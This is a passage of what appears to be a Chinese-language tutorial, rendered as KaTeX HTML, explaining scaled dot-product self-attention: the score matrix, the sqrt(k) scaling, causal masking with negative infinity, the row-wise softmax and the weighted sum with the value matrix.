<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>P</mi><mo>=</mo><mfrac><mrow><mi>Q</mi><mo>⋅</mo><msup><mi>K</mi><mi>T</mi></msup></mrow><msqrt><mi>k</mi></msqrt></mfrac><mtext>   </mtext><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P = \frac{Q \cdot K^T }{\sqrt{k}}\space\space\space (seq\_len,seq\_len)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.4483em;vertical-align:-0.93em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.5183em;"><span style="top:-2.1778em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9322em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord" style="padding-left:0.833em;"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span><span style="top:-2.8922em;"><span class="pstrut" style="height:3em;"/><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="1.08em" viewbox="0 0 400000 1080" preserveaspectratio="xMinYMin slice"><path d="M95,702&#10;c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14&#10;c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54&#10;c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10&#10;s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429&#10;c69,-144,104.5,-217.7,106.5,-221&#10;l0 -0&#10;c5.3,-9.3,12,-14,20,-14&#10;H400000v40H845.2724&#10;s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7&#10;c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z&#10;M834 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1078em;"><span/></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.93em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace"> </span><span class="mspace"> </span><span class="mspace"> </span><span class="mopen">(</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></span></div>
<p>矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></span> 的每个元素 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">P_{ij}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">ij</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span> 表示第 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">i</span></span></span></span></span> 个位置的查询向量 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>x</mi><mi>i</mi><mi>q</mi></msubsup></mrow><annotation encoding="application/x-tex">x^q_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0592em;vertical-align:-0.2769em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7823em;"><span style="top:-2.4231em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.1809em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2769em;"><span/></span></span></span></span></span></span></span></span></span> 与第 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span></span> 个位置的键向量 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>x</mi><mi>j</mi><mi>k</mi></msubsup></mrow><annotation encoding="application/x-tex">x^k_j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2439em;vertical-align:-0.3948em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3948em;"><span/></span></span></span></span></span></span></span></span></span> 之间的原始注意力得分（或称相似度）。</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/316d4617ab944f6fa53696dc5d60e210~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=2s7jvieGhnIjAHF7BrzaSXYslTY%3D" alt="c18.jpg" width="100%" loading="lazy"/></p>
<p>这里之所以要除以一个缩放因子<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msqrt><mi>k</mi></msqrt></mrow><annotation encoding="application/x-tex">\sqrt{k}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.04em;vertical-align:-0.1078em;"/><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9322em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord" style="padding-left:0.833em;"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span><span style="top:-2.8922em;"><span class="pstrut" style="height:3em;"/><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="1.08em" viewbox="0 0 400000 1080" preserveaspectratio="xMinYMin slice"><path d="M95,702&#10;c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14&#10;c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54&#10;c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10&#10;s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429&#10;c69,-144,104.5,-217.7,106.5,-221&#10;l0 -0&#10;c5.3,-9.3,12,-14,20,-14&#10;H400000v40H845.2724&#10;s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7&#10;c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z&#10;M834 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1078em;"><span/></span></span></span></span></span></span></span></span>，主要是在应用 softmax 之前稳定梯度的传播，为了确保计算稳定；当我们设置的 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></span> 较大时，点积 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi><mo>⋅</mo><mi>k</mi></mrow><annotation encoding="application/x-tex">q \cdot k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6389em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></span> 的绝对值可能会变得很大，这会导致 softmax 函数的梯度趋近于零（饱和区），从而引发梯度消失问题。缩放操作能够有效缓解这一现象，确保训练过程的稳定性。</p>
<p>如果此时你需要实现<strong>掩码注意力</strong>（如解码器中所用），此时的操作将变得异常简单，令矩阵<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></span>的上三角区域的值全为负无穷或者一个极大的负数即可（通常取<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup><mtext> or </mtext><mo>−</mo><mtext>inf</mtext></mrow><annotation encoding="application/x-tex">-10^9 \space \text{or} \space -\text{inf}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"/><span class="mord">−</span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord text"><span class="mord">or</span></span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord text"><span class="mord">inf</span></span></span></span></span></span>）,除此之外，再无需其他任何操作，简单方便。</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>P</mi><mrow><mi>m</mi><mi>a</mi><mi>s</mi><mi>k</mi><mi>e</mi><mi>d</mi></mrow></msub><mo stretchy="false">[</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">]</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>P</mi><mo stretchy="false">[</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>j</mi><mo>≤</mo><mi>i</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mi mathvariant="normal">∞</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>j</mi><mo>&gt;</mo><mi>i</mi></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">P_{masked}[i,j] = \left\{\begin{matrix}

 P[i,j] &amp; j\le i\\
 -\infty  &amp; j&gt; i
\end{matrix}\right.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ma</span><span class="mord mathnormal mtight">s</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.4em;vertical-align:-0.95em;"/><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">{</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">−</span><span class="mord">∞</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mord mathnormal">i</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mord mathnormal">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span/></span></span></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span></div>
<p>随后，我们对矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></span>（或 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mrow><mi>m</mi><mi>a</mi><mi>s</mi><mi>k</mi><mi>e</mi><mi>d</mi></mrow></msub></mrow><annotation encoding="application/x-tex">P_{masked}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ma</span><span class="mord mathnormal mtight">s</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>）的<strong>每一行</strong>应用 softmax 函数进行归一化，确保每一行的所有权重之和为 1，从而得到最终的注意力权重矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></span>：</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>S</mi><mo>=</mo><mtext>softmax</mtext><mo stretchy="false">(</mo><mi>P</mi><mo separator="true">,</mo><mtext>dim</mtext><mo>=</mo><mn>1</mn><mo stretchy="false">)</mo><mtext>   </mtext><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">S = \text{softmax}(P,\text{dim}=1) \space \space \space (seq\_len,seq\_len)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord text"><span class="mord">softmax</span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord text"><span class="mord">dim</span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"/><span class="mord">1</span><span class="mclose">)</span><span class="mspace"> </span><span class="mspace"> </span><span class="mspace"> </span><span class="mopen">(</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></span></div>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></span> 矩阵的每一行 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">S[i]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span></span></span></span></span> 都是一个概率分布，它精确地刻画了在生成输出 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">y_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 时，模型应该将多少“注意力”分配给输入序列中的每一个位置 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span></span>。</p>
<p>最后，我们将这个注意力权重矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></span> 与值矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi></mrow><annotation encoding="application/x-tex">V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span></span> 相乘，即可得到输出矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span></span>：</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>Y</mi><mo>=</mo><mi>S</mi><mo>⋅</mo><mi>V</mi><mtext>   </mtext><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>o</mi><mi>u</mi><mi>t</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Y = S \cdot V \space\space\space (seq\_len,out\_size)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace"> </span><span class="mspace"> </span><span class="mspace"> </span><span class="mopen">(</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">o</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mclose">)</span></span></span></span></span></div>
<p>这一步的本质是加权求和。<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span></span> 的每一行 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">y_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 都是 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi></mrow><annotation encoding="application/x-tex">V</annotation></semantics></math></span><span class="katex-html" 